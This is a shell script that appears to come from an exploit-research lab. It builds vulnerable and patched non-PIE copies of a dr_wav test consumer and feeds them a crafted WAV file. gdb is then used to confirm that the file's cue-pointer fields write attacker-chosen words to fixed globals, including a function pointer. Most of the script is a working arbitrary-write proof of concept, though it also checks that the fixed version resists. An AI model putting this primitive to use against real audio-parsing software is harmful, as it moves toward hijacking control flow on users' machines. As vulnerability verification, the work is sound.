#!/bin/sh
# Non-PIE arbitrary-write lane for drwav2shell (W3, 2026-11-25).
#
# The file controls the low 32 bits of the cue pointer; its high half comes
# from the allocator. In a PIE build the heap sits at 0x5555... and the high
# half must be learned from the process. In this -no-pie build of the SAME
# unmodified upstream consumer the brk heap and the binary's globals both sit
# below 4 GiB, so the high half is zero and a file field is the FULL pointer.
#
# No ASLR manipulation, no gdb write, no source patch: the crafted file alone
# selects a fixed application-owned address and the two file words land there.
set -u
HERE=$(cd "$(dirname "$0")" && pwd -P)
LAB=$(cd "$HERE/.." && pwd -P)
EVID="$HERE/evidence"
BUILD="$HERE/build"
WORK="$BUILD/nopie-work"
mkdir -p "$EVID" "$WORK/tests/testvectors/wav/tests"

npass=0
nfail=0
ok() { npass=$((npass + 1)); echo "PASS $1"; }
no() { nfail=$((nfail + 1)); echo "FAIL $1"; }
expect() { if grep -q -- "$2" "$1"; then ok "$3"; else no "$3"; fi; }
expect_not() { if grep -q -- "$2" "$1"; then no "$3"; else ok "$3"; fi; }

if (cd "$LAB" && sha256sum -c pins/pins.sha256 && sha256sum -c consumer/consumer.sha256) >"$EVID/nopie-pins.out" 2>&1; then
    ok "pins and consumer hashes match committed pins"
else
    no "pins and consumer hashes match committed pins"
    exit 1
fi

if ! command -v gdb >/dev/null 2>&1; then
    no "gdb available"
    exit 1
fi

for side in vuln fixed; do
    SRC="$BUILD/nopie-$side"
    mkdir -p "$SRC/tests/wav" "$SRC/tests/common"
    cp "$LAB/pins/$side/dr_wav.h" "$SRC/dr_wav.h" || exit 1
    cp "$HERE/upstream/wav/wav_decoding.c" "$HERE/upstream/wav/wav_common.c" "$SRC/tests/wav/" || exit 1
    cp "$HERE/upstream/common/dr_common.c" "$SRC/tests/common/" || exit 1
    if gcc -O0 -g -no-pie -o "$BUILD/wav_decoding-nopie-$side" "$SRC/tests/wav/wav_decoding.c" -ldl -lm -lpthread; then
        ok "build non-PIE $side consumer (source unmodified)"
    else
        no "build non-PIE $side consumer (source unmodified)"
        exit 1
    fi
done

if file "$BUILD/wav_decoding-nopie-vuln" | grep -q 'LSB executable'; then
    ok "vuln binary is a fixed-address non-PIE executable"
else
    no "vuln binary is a fixed-address non-PIE executable"
fi

gen() {
    python3 "$HERE/make_wav.py" "$WORK/tests/testvectors/wav/tests/attack.wav" "$1" 0x4841434b "$2" >"$EVID/nopie-gen.out" 2>&1 || exit 1
}

# Read a target global at the first breakpoint after drwav_init_with_metadata.
readback() {
    bin=$1; out=$2; sym=$3
    printf 'set pagination off\nbreak wav_decoding.c:326\nrun\nprintf "TARGET_ADDR=%%p\\n", &%s\nx/2gx &%s\ncontinue\n' "$sym" "$sym" >"$WORK/probe.gdb"
    (cd "$WORK" && gdb -q -batch -x "$WORK/probe.gdb" --args "$bin") >"$out" 2>&1
}

CHOSEN='0x424242424841434b'

# Target 1: consumer's own BSS global g_libsndfile at 0x41e108.
# The cue write lands at hijacked pointer + 24, so the file supplies 0x41e0f0.
gen 0x41e0f0 1
readback "$BUILD/wav_decoding-nopie-vuln" "$EVID/nopie-vuln-global.out" g_libsndfile
expect "$EVID/nopie-vuln-global.out" "$CHOSEN" "file-chosen words in fixed BSS global (vuln)"
expect "$EVID/nopie-vuln-global.out" 'TARGET_ADDR=0x41e108' "global is at the fixed link-time address"

readback "$BUILD/wav_decoding-nopie-fixed" "$EVID/nopie-fixed-global.out" g_libsndfile
expect_not "$EVID/nopie-fixed-global.out" "$CHOSEN" "fixed 0.14.6: no chosen write to global"

gen 0x41e0f0 0
readback "$BUILD/wav_decoding-nopie-vuln" "$EVID/nopie-safe-global.out" g_libsndfile
expect_not "$EVID/nopie-safe-global.out" "$CHOSEN" "safe smpl loop count: no chosen write"

# Target 2: a DIFFERENT global, the function pointer libsndfile__sf_close at
# 0x41e118. Only the file's low pointer field changes (0x41e100).
gen 0x41e100 1
readback "$BUILD/wav_decoding-nopie-vuln" "$EVID/nopie-vuln-fnptr.out" libsndfile__sf_close
expect "$EVID/nopie-vuln-fnptr.out" "$CHOSEN" "same primitive retargeted to a function-pointer global"
expect "$EVID/nopie-vuln-fnptr.out" 'TARGET_ADDR=0x41e118' "function pointer is at its fixed link-time address"

# Uninstrumented consequence: corrupting g_libsndfile makes the consumer fault
# later in libsndfile_uninit. This is expected, not a control-pass criterion.
(cd "$WORK" && "$BUILD/wav_decoding-nopie-vuln"; echo "rc=$?") >"$EVID/nopie-raw.out" 2>&1
expect "$EVID/nopie-raw.out" 'rc=139' "unmodified consumer faults after using the corrupted global"

echo "TOTAL PASS=$npass FAIL=$nfail"
[ "$nfail" -eq 0 ]
